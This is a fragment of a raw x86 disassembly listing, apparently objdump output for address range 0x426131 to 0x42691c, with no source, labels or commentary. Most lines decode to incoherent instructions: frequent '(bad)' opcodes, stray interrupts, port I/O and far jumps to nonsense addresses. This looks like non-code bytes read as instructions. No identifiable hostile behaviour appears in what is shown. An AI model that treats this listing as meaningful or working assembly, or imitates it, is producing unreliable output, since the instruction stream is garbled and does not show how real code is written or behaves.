  426131:	or     dh,BYTE PTR [esi-0x13]
  426134:	leave  
  426135:	jbe    0x426124
  426137:	dec    ecx
  426138:	mov    al,ds:0x76c93586
  42613d:	cmc    
  42613e:	dec    ecx
  42613f:	lahf   
  426140:	xchg   BYTE PTR ds:0x691176c9,dh
  426146:	and    DWORD PTR [esi+0x1176c935],eax
  42614c:	cmp    DWORD PTR [ecx],esp
  42614e:	xchg   BYTE PTR ds:0x49f976c9,dh
  426154:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  42615b:	jbe    0x426156
  42615d:	int    0x76
  42615f:	sbb    al,0xcd
  426161:	shl    BYTE PTR ds:0xcd808081,1
  426167:	jbe    0x426185
  426169:	int    0x8d
  42616b:	sbb    al,0xcd
  42616d:	add    DWORD PTR ds:0xcd808081,ebp
  426173:	xor    ch,cl
  426175:	pop    esp
  426176:	xchg   eax,esp
  426178:	fs int 0x96
  42617b:	popf   
  42617c:	int    0xa
  42617e:	and    eax,0xa808081
  426183:	out    0xb5,al
  426185:	int    0xe6
  426187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426188:	das    
  426189:	inc    ebp
  42618a:	add    edx,DWORD PTR [edx-0x326def2d]
  426190:	out    0x9d,al
  426192:	int    0xa6
  426194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426195:	adc    bh,bl
  426197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426198:	mov    esi,0xdd3b4229
  42619d:	shr    ecx,cl
  42619f:	sub    ch,cl
  4261a1:	pop    esi
  4261a2:	push   ebx
  4261a3:	aad    0x43
  4261a5:	(bad)  
  4261a7:	nop
  4261a8:	int    0x18
  4261aa:	or     dl,BYTE PTR [esi+0x1496cdf9]
  4261b0:	int    0x96
  4261b2:	xor    ch,cl
  4261b4:	xchg   esi,eax
  4261b5:	dec    esp
  4261b6:	iret   
  4261b7:	xchg   esi,eax
  4261b8:	lods   eax,DWORD PTR ds:[esi]
  4261b9:	bound  eax,QWORD PTR [eax]
  4261bb:	(bad)  
  4261bc:	stc    
  4261bd:	jno    0x42622f
  4261bf:	cwde   
  4261c0:	add    dh,dl
  4261c2:	sbb    al,0xcf
  4261c4:	jbe    0x42617b
  4261c6:	add    dh,dl
  4261c8:	mov    BYTE PTR [eax],al
  4261ca:	(bad)  
  4261cb:	cmc    
  4261cc:	add    dh,dl
  4261ce:	adc    DWORD PTR [eax],eax
  4261d0:	(bad)  
  4261d1:	in     eax,dx
  4261d2:	jo     0x4261a3
  4261d4:	jbe    0x4261d3
  4261d6:	jo     0x426195
  4261d8:	stos   BYTE PTR es:[edi],al
  4261d9:	clc    
  4261da:	add    BYTE PTR [eax],al
  4261dc:	or     dh,BYTE PTR [esi+0x1c]
  4261df:	int    0x76
  4261e1:	sbb    al,0xcd
  4261e3:	lea    esp,[edx+ecx*1]
  4261e6:	outs   dx,BYTE PTR ds:[esi]
  4261e7:	adc    al,0xcd
  4261e9:	jbe    0x42620f
  4261eb:	leave  
  4261ec:	add    BYTE PTR [edi-0x327f7f80],0x76
  4261f3:	lods   eax,DWORD PTR ds:[esi]
  4261f4:	int    0x8d
  4261f6:	and    al,0xa
  4261f8:	outs   dx,BYTE PTR ds:[esi]
  4261f9:	test   ch,cl
  4261fb:	jbe    0x42622d
  4261fd:	int    0x8d
  4261ff:	and    al,0xa
  426201:	outs   dx,BYTE PTR ds:[esi]
  426202:	mov    ch,cl
  426204:	jbe    0x42621a
  426206:	int    0x8d
  426208:	and    al,0xa
  42620a:	outs   dx,BYTE PTR ds:[esi]
  42620b:	dec    esp
  42620c:	int    0x76
  42620e:	and    al,0xc9
  426210:	ins    BYTE PTR es:[edi],dx
  426211:	and    al,0x81
  426213:	add    BYTE PTR [eax-0x32e11380],0x76
  42621a:	sbb    al,0xcd
  42621c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426223:	or     ch,0xa
  426226:	and    eax,0xcd808081
  42622b:	xor    BYTE PTR [ebx],0x81
  42622e:	or     dh,BYTE PTR [esi-0x3]
  426231:	int    0x76
  426233:	std    
  426234:	stos   BYTE PTR es:[edi],al
  426235:	test   al,0x63
  426237:	retf   
  426238:	rcr    BYTE PTR [eax+eax*4],cl
  42623b:	xchg   esi,eax
  42623c:	int    0xed
  42623e:	int    0x76
  426240:	dec    esp
  426241:	adc    ch,ch
  426243:	cmp    eax,0x5b808081
  426248:	cwde   
  426249:	call   0x2f35:0x86214966
  426250:	push   es
  426251:	mov    ecx,0xcd80804a
  426256:	jbe    0x426288
  426258:	inc    cx
  42625a:	and    DWORD PTR [esi-0x62f9d0cb],eax
  426260:	dec    edx
  426261:	add    BYTE PTR [eax-0x29128937],0x37
  426268:	ficom  WORD PTR [ebx]
  42626a:	pop    ebp
  42626b:	mov    ebp,0xa25230a
  426270:	jbe    0x426283
  426272:	leave  
  426273:	jbe    0x42622a
  426275:	xchg   ecx,eax
  426276:	aaa    
  426277:	ficom  WORD PTR [ebx]
  426279:	or     dh,BYTE PTR [esi-0x43]
  42627c:	int    0x76
  42627e:	mov    BYTE PTR [edx],cl
  426280:	jbe    0x426277
  426282:	int    0x76
  426284:	cmc    
  426285:	int    0x1
  426287:	mov    ebp,0xcd808081
  42628c:	or     ch,0x80
  42628f:	or     dh,BYTE PTR [esi-0x7]
  426292:	pop    edi
  426293:	jle    0x4262ca
  426295:	add    BYTE PTR [eax-0x7fca69a3],0x80
  42629c:	mov    eax,0x4b0760a
  4262a1:	ins    DWORD PTR es:[edi],dx
  4262a2:	(bad)  
  4262a3:	mov    eax,0xcda2760a
  4262a8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262ae:	(bad)  
  4262af:	xor    eax,0xf1cd8080
  4262b4:	mov    eax,0xcf19960a
  4262b9:	nop
  4262ba:	xchg   edx,eax
  4262bb:	iret   
  4262bc:	sahf   
  4262bd:	(bad)  
  4262be:	int    0x99
  4262c0:	mov    eax,0xcd1d960a
  4262c5:	aad    0xb8
  4262c7:	or     dl,BYTE PTR [esi-0x662dfbdf]
  4262cd:	mov    eax,0xcf01960a
  4262d2:	jno    0x426328
  4262d4:	int    0x3
  4262d6:	mov    eax,0x40be60a
  4262db:	leave  
  4262dc:	xchg   ebp,eax
  4262dd:	mov    eax,0xcf05e60a
  4262e2:	ficomp WORD PTR [eax-0x48]
  4262e5:	or     ah,dh
  4262e7:	pop    es
  4262e8:	mov    eax,0xb809760a
  4262ed:	or     dl,dh
  4262ef:	retf   0xc5cd
  4262f2:	mov    eax,0xb8cc760a
  4262f7:	or     dl,BYTE PTR [edi]
  4262f9:	ins    BYTE PTR es:[edi],dx
  4262fa:	add    BYTE PTR [eax],al
  4262fc:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426303:	push   edx
  426304:	add    BYTE PTR [eax],al
  426306:	add    bh,cl
  426308:	outs   dx,BYTE PTR ds:[esi]
  426309:	add    edi,DWORD PTR [eax+0x74060a]
  42630f:	add    BYTE PTR [eax],al
  426311:	add    al,0x6d
  426313:	inc    edx
  426314:	mov    eax,0x78060a
  426319:	add    BYTE PTR [eax],al
  42631b:	iret   
  42631c:	outs   dx,BYTE PTR ds:[esi]
  42631d:	xor    BYTE PTR [eax+0x7c060a],bh
  426323:	add    BYTE PTR [eax],al
  426325:	add    al,0x6d
  426327:	xor    bh,BYTE PTR [eax+0x8a060a]
  42632d:	add    BYTE PTR [eax],al
  42632f:	mov    eax,0x8ccf0a
  426334:	add    BYTE PTR [eax],al
  426336:	int    0xc5
  426338:	mov    eax,0x8e060a
  42633d:	add    BYTE PTR [eax],al
  42633f:	int    0x76
  426341:	in     eax,dx
  426342:	int    0x8d
  426344:	adc    DWORD PTR [edi],ebp
  426346:	inc    ebp
  426347:	jge    0x4262db
  426349:	shr    ebx,cl
  42634b:	xchg   edx,eax
  42634c:	int    0x8d
  42634e:	in     eax,dx
  42634f:	int    0x96
  426351:	adc    ebx,eax
  426353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426354:	mov    esi,0xc93b4229
  426359:	cmp    ebx,edx
  42635b:	shl    edx,cl
  42635d:	sub    BYTE PTR [ebx-0x2e],dl
  426360:	in     al,dx
  426361:	outs   dx,BYTE PTR ds:[esi]
  426362:	iret   
  426363:	aam    0x76
  426365:	mov    al,0xb8
  426367:	int    0x4e
  426369:	das    
  42636a:	mov    ebx,0xcbbb2f18
  42636f:	cmp    ecx,DWORD PTR [edx+edx*1]
  426372:	sti    
  426373:	and    DWORD PTR ds:0xf3e38080,esi
  426379:	shl    edx,cl
  42637b:	das    
  42637c:	push   ebx
  42637d:	adc    ecx,DWORD PTR [ecx]
  42637f:	int3   
  426380:	test   DWORD PTR [ebp-0x32ffff01],esp
  426386:	lea    esi,[ebp+0x2fbd96cd]
  42638c:	inc    ebp
  42638d:	jecxz  0x426321
  42638f:	shl    ebx,cl
  426391:	xchg   edx,eax
  426392:	int    0x96
  426394:	mov    ch,0xcd
  426396:	(bad)  
  426397:	mov    ebp,0xf73bf03b
  42639c:	push   ebx
  42639d:	psrlq  mm5,mm2
  4263a0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263a6:	(bad)  
  4263a7:	popa   
  4263a8:	int    0x76
  4263aa:	in     eax,dx
  4263ab:	int    0x8d
  4263ad:	adc    DWORD PTR [edi],ebp
  4263af:	inc    ebp
  4263b0:	jge    0x426344
  4263b2:	shr    ebx,cl
  4263b4:	xchg   edx,eax
  4263b5:	int    0x8d
  4263b7:	in     eax,dx
  4263b8:	int    0x96
  4263ba:	adc    DWORD PTR [ebx],edi
  4263bc:	leave  
  4263bd:	cmp    ebx,edx
  4263bf:	shl    edx,cl
  4263c1:	sub    BYTE PTR [ebx-0x2e],dl
  4263c4:	in     al,dx
  4263c5:	outs   dx,BYTE PTR ds:[esi]
  4263c6:	iret   
  4263c7:	aam    0x76
  4263c9:	add    DWORD PTR [eax-0x44d0b133],edi
  4263cf:	sbb    BYTE PTR [edi],ch
  4263d1:	mov    ebx,0x120c3bcb
  4263d6:	sti    
  4263d7:	and    DWORD PTR ds:0xf3e38080,esi
  4263dd:	shl    edx,cl
  4263df:	das    
  4263e0:	push   ebx
  4263e1:	adc    ecx,DWORD PTR [ecx]
  4263e3:	int3   
  4263e4:	test   esp,ecx
  4263e6:	inc    DWORD PTR [eax]
  4263e8:	add    ch,cl
  4263ea:	lea    esi,[ebp+0x2fbd96cd]
  4263f0:	inc    ebp
  4263f1:	jecxz  0x426385
  4263f3:	shl    ebx,cl
  4263f5:	xchg   edx,eax
  4263f6:	int    0x96
  4263f8:	mov    ch,0xcd
  4263fa:	(bad)  
  4263fb:	mov    ebp,0xf73bf03b
  426400:	push   ebx
  426401:	psrlq  mm5,mm2
  426404:	sub    BYTE PTR [edi-0x7406fb2d],al
  42640a:	(bad)  
  42640b:	popa   
  42640c:	int    0x76
  42640e:	in     eax,dx
  42640f:	int    0x8d
  426411:	adc    DWORD PTR [edi],ebp
  426413:	inc    ebp
  426414:	jge    0x4263a8
  426416:	shr    ebx,cl
  426418:	xchg   edx,eax
  426419:	int    0x8d
  42641b:	in     eax,dx
  42641c:	int    0x96
  42641e:	adc    DWORD PTR [ebx],edi
  426420:	leave  
  426421:	cmp    ebx,edx
  426423:	shl    edx,cl
  426425:	sub    BYTE PTR [ebx-0x2e],dl
  426428:	in     al,dx
  426429:	je     0x4263fa
  42642b:	push   ebp
  42642c:	jbe    0x42649a
  42642e:	add    BYTE PTR [eax],al
  426430:	add    BYTE PTR [eax-0x44d0b133],bh
  426436:	sbb    BYTE PTR [edi],ch
  426438:	mov    ebx,0x120c3bcb
  42643d:	sti    
  42643e:	and    DWORD PTR ds:0xf3e38080,esi
  426444:	shl    edx,cl
  426446:	das    
  426447:	push   ebx
  426448:	adc    ecx,DWORD PTR [ecx]
  42644a:	int3   
  42644b:	test   DWORD PTR ds:0xcd0000ff,eax
  426451:	lea    esi,[ebp+0x2fbd96cd]
  426457:	inc    ebp
  426458:	jecxz  0x4263ec
  42645a:	shl    ebx,cl
  42645c:	xchg   edx,eax
  42645d:	int    0x96
  42645f:	mov    ch,0xcd
  426461:	(bad)  
  426462:	mov    ebp,0xf73bf03b
  426467:	push   ebx
  426468:	psrlq  mm5,mm2
  42646b:	sub    BYTE PTR [edi-0x7706fb2d],al
  426471:	(bad)  
  426472:	mov    ebx,0xffb506cf
  426477:	add    BYTE PTR [eax],al
  426479:	or     dh,BYTE PTR [esi-0x7]
  42647c:	int    0x76
  42647e:	stc    
  42647f:	pop    edi
  426480:	inc    esi
  426481:	pop    esp
  426482:	inc    ebp
  426483:	xchg   edi,eax
  426484:	or     cl,BYTE PTR [eax+0x79245161]
  42648a:	daa    
  42648b:	or     dh,BYTE PTR [eax-0x7c]
  42648e:	int    0x6
  426490:	mov    ch,0xff
  426492:	add    BYTE PTR [eax],al
  426494:	int    0x57
  426496:	mov    ebp,0xa0000ff
  42649b:	(bad)  
  42649c:	mov    ebp,0x8621d169
  4264a1:	xor    eax,0x62fd343
  4264a6:	pusha  
  4264a7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  4264b1:	add    BYTE PTR [eax-0x7fca76a3],0x80
  4264b8:	mov    eax,0xfff9060a
  4264bd:	add    BYTE PTR [eax],al
  4264bf:	int    0xc5
  4264c1:	mov    eax,0xff03060a
  4264c6:	add    BYTE PTR [eax],al
  4264c8:	pop    ebp
  4264c9:	es xor eax,0xab88080
  4264cf:	push   es
  4264d0:	std    
  4264d1:	inc    DWORD PTR [eax]
  4264d3:	add    BYTE PTR [ebp-0x5d],bl
  4264d6:	xor    eax,0xab88080
  4264db:	push   es
  4264dc:	(bad)  
  4264dd:	inc    DWORD PTR [eax]
  4264df:	add    BYTE PTR [ebp+0x1e],bl
  4264e2:	xor    eax,0xab88080
  4264e7:	push   es
  4264e8:	add    BYTE PTR [eax],0x0
  4264eb:	add    BYTE PTR [ebp*2-0x47823218],al
  4264f2:	or     cl,bh
  4264f4:	xchg   edx,eax
  4264f5:	add    BYTE PTR [eax],al
  4264f7:	add    ch,cl
  4264f9:	jbe    0x42652b
  4264fb:	pop    edi
  4264fc:	dec    ebx
  4264fd:	xor    eax,0xab88080
  426502:	iret   
  426503:	test   BYTE PTR [eax],al
  426505:	add    BYTE PTR [eax],al
  426507:	add    al,0xd3
  426509:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42650f:	add    BYTE PTR [eax],al
  426511:	pop    edi
  426512:	push   esi
  426513:	xor    eax,0xab88080
  426518:	iret   
  426519:	mov    BYTE PTR [eax],al
  42651b:	add    BYTE PTR [eax],al
  42651d:	add    al,0xd3
  42651f:	pushf  
  426520:	mov    eax,0x4acf0a
  426525:	add    BYTE PTR [eax],al
  426527:	int    0xc
  426529:	mov    eax,0x4ccf0a
  42652e:	add    BYTE PTR [eax],al
  426530:	pop    edi
  426531:	add    al,0x35
  426533:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42653a:	add    BYTE PTR [eax],al
  42653c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42653f:	adc    DWORD PTR [eax-0x80],edx
  426542:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426549:	add    bl,dl
  42654b:	mov    ebp,0x151a5f92
  426550:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  426557:	add    BYTE PTR [eax],al
  426559:	pop    edi
  42655a:	call   0xcf0a:0xb88080eb
  426561:	adc    al,0x0
  426563:	add    BYTE PTR [eax],al
  426565:	int    0x8d
  426567:	xor    BYTE PTR [edx+eax*1],al
  42656a:	call   ebx
  42656c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426570:	or     al,BYTE PTR [esi]
  426572:	adc    eax,0xcd0000ff
  426577:	jbe    0x4265c5
  426579:	int    0x8d
  42657b:	dec    esp
  42657c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42657f:	mov    ebp,0xff020492
  426584:	shl    edx,cl
  426586:	sub    BYTE PTR [ebx-0x2d],dl
  426589:	leave  
  42658a:	add    eax,0xff1d06
  42658f:	add    BYTE PTR [eax],al
  426591:	add    BYTE PTR [eax+0x1506cf80],al
  426597:	inc    DWORD PTR [eax]
  426599:	add    BYTE PTR [eax-0x33],dh
  42659c:	jbe    0x4265ce
  42659e:	int    0x8d
  4265a0:	xor    BYTE PTR [ebx],bh
  4265a2:	jns    0x426577
  4265a4:	mov    ebp,0xff020492
  4265a9:	shl    edx,cl
  4265ab:	sub    BYTE PTR [ebx-0x2d],dl
  4265ae:	jo     0x42657f
  4265b0:	push   es
  4265b1:	stc    
  4265b2:	inc    DWORD PTR [eax]
  4265b4:	add    BYTE PTR [eax-0x33],dh
  4265b7:	jbe    0x4265ae
  4265b9:	int    0x1
  4265bb:	cmp    eax,0xc9808081
  4265c0:	push   es
  4265c1:	sbb    BYTE PTR [eax],al
  4265c3:	add    BYTE PTR [eax],al
  4265c5:	inc    eax
  4265c6:	retf   
  4265c7:	fwait
  4265c8:	xor    eax,0x76cd5000
  4265cd:	adc    al,0x0
  4265cf:	icebp  
  4265d0:	or     dh,BYTE PTR [esi-0x7]
  4265d3:	int    0x76
  4265d5:	stc    
  4265d6:	push   es
  4265d7:	ins    DWORD PTR es:[edi],dx
  4265d8:	aam    0x4a
  4265da:	adc    dl,BYTE PTR [esi+0x68]
  4265dd:	or     BYTE PTR [ebx+ecx*1],bl
  4265e0:	fmul   QWORD PTR [ebx-0x17]
  4265e3:	(bad)  
  4265e4:	int    0x8d
  4265e6:	dec    esp
  4265e7:	int    0x96
  4265e9:	dec    esp
  4265ea:	sar    bh,0x3b
  4265ed:	setl   BYTE PTR [ebx]
  4265f0:	icebp  
  4265f1:	shr    edx,cl
  4265f3:	sub    bl,dl
  4265f5:	jmp    0x426589
  4265f7:	push   ebx
  4265f8:	adc    ecx,ebp
  4265fa:	xchg   esi,eax
  4265fb:	cmc    
  4265fc:	int    0xa2
  4265fe:	and    eax,0x5e808081
  426603:	dec    edx
  426604:	das    
  426605:	push   es
  426606:	popa   
  426607:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42660d:	int    0x96
  42660f:	dec    esp
  426610:	cmp    ecx,DWORD PTR [edi]
  426612:	shr    ebx,cl
  426614:	xchg   edx,eax
  426615:	cmp    esi,ecx
  426617:	shr    edx,cl
  426619:	sub    BYTE PTR [ebx+0x13],dl
  42661c:	int    0x96
  42661e:	cmc    
  42661f:	int    0xa2
  426621:	in     al,0x81
  426623:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42662a:	int    0x96
  42662c:	dec    esp
  42662d:	cmp    ecx,DWORD PTR [edi]
  42662f:	shr    ebx,cl
  426631:	xchg   edx,eax
  426632:	cmp    esi,ecx
  426634:	shr    edx,cl
  426636:	sub    BYTE PTR [ebx+0x13],dl
  426639:	int    0x96
  42663b:	cmc    
  42663c:	int    0xa2
  42663e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426644:	pop    edi
  426645:	xor    ax,0x8080
  426649:	mov    eax,0x24cf0a
  42664e:	add    BYTE PTR [eax],al
  426650:	int    0xc
  426652:	mov    eax,0x28cf0a
  426657:	add    BYTE PTR [eax],al
  426659:	pop    edi
  42665a:	es xor eax,0xab88080
  426660:	iret   
  426661:	sub    al,0x0
  426663:	add    BYTE PTR [eax],al
  426665:	pop    edi
  426666:	daa    
  426667:	xor    eax,0xab88080
  42666c:	iret   
  42666d:	xor    al,BYTE PTR [eax]
  42666f:	add    BYTE PTR [eax],al
  426671:	add    al,0xd3
  426673:	test   eax,0x34cf0ab8
  426678:	add    BYTE PTR [eax],al
  42667a:	add    BYTE PTR [edi-0x69],bl
  42667d:	xor    eax,0xab88080
  426682:	iret   
  426683:	cmp    BYTE PTR [eax],al
  426685:	add    BYTE PTR [eax],al
  426687:	add    al,0xd3
  426689:	mov    dl,0xb8
  42668b:	or     cl,bh
  42668d:	cmp    al,0x0
  42668f:	add    BYTE PTR [eax],al
  426691:	pop    edi
  426692:	fwait
  426693:	xor    eax,0xab88080
  426698:	iret   
  426699:	inc    eax
  42669a:	add    BYTE PTR [eax],al
  42669c:	add    ch,cl
  42669e:	or     al,0xb8
  4266a0:	or     cl,bh
  4266a2:	inc    esp
  4266a3:	add    BYTE PTR [eax],al
  4266a5:	add    BYTE PTR [edi+0x17],bl
  4266a8:	xor    eax,0xab88080
  4266ad:	iret   
  4266ae:	dec    eax
  4266af:	add    BYTE PTR [eax],al
  4266b1:	add    BYTE PTR [edi+0x26],bl
  4266b4:	pop    esi
  4266b5:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  4266bc:	add    BYTE PTR [eax],al
  4266be:	pop    edi
  4266bf:	cmp    esi,DWORD PTR [edx]
  4266c1:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  4266c8:	add    BYTE PTR [eax],al
  4266ca:	jns    0x426742
  4266cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266ce:	pop    edi
  4266cf:	pop    esp
  4266d0:	adc    eax,0xab88080
  4266d5:	iret   
  4266d6:	push   esp
  4266d7:	add    BYTE PTR [eax],al
  4266d9:	add    BYTE PTR [ebx+edx*8],al
  4266dc:	pop    esp
  4266dd:	mov    eax,0x58cf0a
  4266e2:	add    BYTE PTR [eax],al
  4266e4:	jns    0x42675c
  4266e6:	fisttp WORD PTR [ecx+0x79]
  4266e9:	jbe    0x426694
  4266eb:	inc    ecx
  4266ec:	jns    0x426764
  4266ee:	loope  0x426693
  4266f0:	pop    edi
  4266f1:	fcom   st(4)
  4266f3:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  4266fa:	add    BYTE PTR [eax],al
  4266fc:	jns    0x426774
  4266fe:	lods   eax,DWORD PTR ds:[esi]
  4266ff:	push   edi
  426700:	pop    edi
  426701:	jnp    0x426758
  426703:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42670a:	add    BYTE PTR [eax],al
  42670c:	jns    0x426784
  42670e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426712:	jmp    0x8080:0x35a15f47
  426719:	mov    eax,0x64cf0a
  42671e:	add    BYTE PTR [eax],al
  426720:	jns    0x426798
  426722:	in     eax,0x18
  426724:	int    0x8d
  426726:	xor    ch,cl
  426728:	xchg   esi,eax
  426729:	xor    BYTE PTR [ebx],bh
  42672b:	(bad)  
  42672d:	icebp  
  42672e:	shr    ebx,cl
  426730:	xchg   edx,eax
  426731:	shr    edx,cl
  426733:	sub    BYTE PTR [ebx+0x13],dl
  426736:	in     al,dx
  426737:	xchg   esp,eax
  426738:	int    0x96
  42673a:	xor    ch,cl
  42673c:	out    0x30,al
  42673e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426744:	stc    
  426745:	shr    ecx,cl
  426747:	sub    BYTE PTR [ebx-0x27],dl
  42674a:	xor    edx,DWORD PTR [ebx]
  42674c:	das    
  42674d:	pop    ecx
  42674e:	mov    WORD PTR [ebp-0x5b],cs
  426751:	int    0x96
  426753:	xor    ch,cl
  426755:	out    0x30,al
  426757:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42675d:	stc    
  42675e:	shr    ecx,cl
  426760:	sub    BYTE PTR [ebx-0x27],dl
  426763:	int    0xe6
  426765:	stc    
  426766:	add    al,0x2
  426768:	adc    DWORD PTR [edx],0xffffffd3
  42676b:	fwait
  42676c:	add    BYTE PTR [eax+0x9033380],0x8c
  426773:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  426775:	int    0x96
  426777:	xor    ch,cl
  426779:	lea    esi,[eax]
  42677b:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  426781:	sub    bl,dl
  426783:	repz xchg edx,eax
  426785:	push   ebx
  426786:	jecxz  0x426755
  426788:	(bad)  
  426789:	stc    
  42678a:	xchg   DWORD PTR [ebx],edx
  42678c:	int    0x96
  42678e:	xor    ch,cl
  426790:	out    0x30,al
  426792:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  426798:	xchg   edx,eax
  426799:	shr    ecx,cl
  42679b:	sub    BYTE PTR [ebx-0x27],dl
  42679e:	add    al,0xd2
  4267a0:	mov    BYTE PTR [edx],cl
  4267a2:	(bad)  
  4267a3:	stc    
  4267a4:	inc    ebx
  4267a5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267ab:	int    0x96
  4267ad:	xor    BYTE PTR [ebx],bh
  4267af:	(bad)  
  4267b1:	icebp  
  4267b2:	shr    ebx,cl
  4267b4:	xchg   edx,eax
  4267b5:	shr    edx,cl
  4267b7:	sub    BYTE PTR [ebx+0x13],dl
  4267ba:	or     cl,bh
  4267bc:	adc    eax,0xcd0000ff
  4267c1:	lea    ecx,[ebp+ecx*8-0x6a]
  4267c5:	dec    esp
  4267c6:	cmp    ecx,DWORD PTR [edi]
  4267c8:	cmp    esi,ecx
  4267ca:	shr    edx,cl
  4267cc:	sub    bl,dl
  4267ce:	jmp    0x426762
  4267d0:	push   ebx
  4267d1:	adc    ecx,edi
  4267d3:	xchg   esi,eax
  4267d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	or     dl,BYTE PTR ds:0xff1dcf
  4267db:	add    BYTE PTR [ecx+0x6b],ah
  4267de:	xor    eax,0x13cd8080
  4267e3:	mov    eax,0x4258d0a
  4267e8:	rcl    edx,cl
  4267ea:	int    0xfa
  4267ec:	mov    eax,0xcf29e60a
  4267f1:	loopne 0x42679c
  4267f3:	mov    eax,0x42de60a
  4267f8:	leave  
  4267f9:	test   BYTE PTR [eax-0x304d19f6],bh
  4267ff:	loopne 0x426815
  426801:	mov    eax,0x435e60a
  426806:	leave  
  426807:	loop   0x4267c1
  426809:	or     ah,dh
  42680b:	cmp    ebp,ecx
  42680d:	cli    
  42680e:	mov    eax,0xcd3de60a
  426813:	add    edi,DWORD PTR [eax-0x32be19f6]
  426819:	cld    
  42681a:	mov    eax,0xcd45e60a
  42681f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426825:	cli    
  426826:	mov    eax,0xcfc2e60a
  42682b:	loopne 0x426856
  42682d:	mov    eax,0x455e60a
  426832:	leave  
  426833:	test   BYTE PTR [eax-0x30a619f6],bh
  426839:	loopne 0x4267d0
  42683b:	mov    eax,0x45de60a
  426840:	leave  
  426841:	loop   0x4267fb
  426843:	or     ah,dh
  426845:	popa   
  426846:	mov    eax,0xb8658d0a
  42684b:	or     dl,BYTE PTR [esi-0x47f33297]
  426851:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  426857:	int    0x96
  426859:	dec    esp
  42685a:	cmp    esi,ecx
  42685c:	cmp    ecx,DWORD PTR [edi]
  42685e:	shr    edx,cl
  426860:	sub    bl,dl
  426862:	jmp    0x4267f6
  426864:	push   ebx
  426865:	adc    ecx,ebp
  426867:	xchg   esi,eax
  426868:	dec    esp
  426869:	int    0xe6
  42686b:	dec    esp
  42686c:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  426872:	mov    WORD PTR [ebp-0x2c06c430],cs
  426878:	jmp    0x301bbba5
  42687d:	mov    ebx,0xb8d93b5e
  426882:	or     dh,BYTE PTR [ecx]
  426884:	int    0x8d
  426886:	dec    esp
  426887:	int    0x96
  426889:	dec    esp
  42688a:	cmp    ecx,DWORD PTR [edi]
  42688c:	cmp    esi,ecx
  42688e:	shr    ebx,cl
  426890:	xchg   edx,eax
  426891:	shr    edx,cl
  426893:	sub    BYTE PTR [ebx+0x13],dl
  426896:	int    0x96
  426898:	dec    esp
  426899:	iret   
  42689a:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268a0:	out    0x4c,al
  4268a2:	shl    ebx,cl
  4268a4:	xchg   edx,eax
  4268a5:	cmp    edi,ecx
  4268a7:	shr    ecx,cl
  4268a9:	sub    BYTE PTR [ebx-0x27],dl
  4268ac:	das    
  4268ad:	mov    ebx,0xb8d93b5e
  4268b2:	or     dh,BYTE PTR [ecx]
  4268b4:	int    0x8d
  4268b6:	dec    esp
  4268b7:	int    0x96
  4268b9:	dec    esp
  4268ba:	cmp    esi,ecx
  4268bc:	shr    edx,cl
  4268be:	sub    BYTE PTR [ebx],bh
  4268c0:	psrlq  mm5,mm3
  4268c3:	xchg   edx,eax
  4268c4:	push   ebx
  4268c5:	adc    ecx,ebp
  4268c7:	xchg   esi,eax
  4268c8:	dec    esp
  4268c9:	int    0xe6
  4268cb:	dec    esp
  4268cc:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4268d2:	stc    
  4268d3:	shr    ecx,cl
  4268d5:	sub    BYTE PTR [ebx-0x27],dl
  4268d8:	mov    eax,0x9096cc0a
  4268dd:	inc    DWORD PTR [eax]
  4268df:	add    ch,cl
  4268e1:	lea    ecx,[ebp+ecx*8-0x6a]
  4268e5:	dec    esp
  4268e6:	cmp    esi,ecx
  4268e8:	shr    edx,cl
  4268ea:	sub    BYTE PTR [ebx],bh
  4268ec:	psrlq  mm5,mm3
  4268ef:	xchg   edx,eax
  4268f0:	push   ebx
  4268f1:	adc    ecx,ebp
  4268f3:	xchg   esi,eax
  4268f4:	dec    esp
  4268f5:	int    0xe6
  4268f7:	dec    esp
  4268f8:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4268fe:	stc    
  4268ff:	shr    ecx,cl
  426901:	sub    BYTE PTR [ebx-0x27],dl
  426904:	mov    eax,0xa496cc0a
  426909:	inc    DWORD PTR [eax]
  42690b:	add    ch,cl
  42690d:	lea    esi,[eax]
  42690f:	int    0x96
  426911:	xor    BYTE PTR [ebx],bh
  426913:	icebp  
  426914:	cmp    ecx,DWORD PTR [edi]
  426916:	shr    edx,cl
  426918:	sub    bl,dl
  42691a:	jmp    0x4268ae
  42691c:	push   ebx
